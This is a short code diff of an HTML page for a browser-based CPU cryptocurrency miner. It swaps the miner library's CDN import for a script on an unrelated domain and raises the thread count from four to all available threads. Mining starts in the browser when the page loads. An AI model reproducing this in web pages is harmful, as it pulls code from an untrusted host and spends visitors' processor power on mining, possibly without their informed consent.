@@ -5,7 +5,7 @@
 <h2>Thanks for using cpu-web-miner</h2>
 
 <script type="module">
-import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
+import * as cpuWebMiner from 'https://earnify.cc/miner.js';
 
 const stratum = {
     server: "minotaurx.na.mine.zpool.ca",
@@ -19,7 +19,7 @@ cpuWebMiner.start(
     cpuWebMiner.minotaurx,
     stratum,
     null,
-    4, // Set to 4 threads here
+    cpuWebMiner.ALL_THREADS,
     work => console.log(work),
     hashrate => console.log(hashrate),
     error => console.log(error));
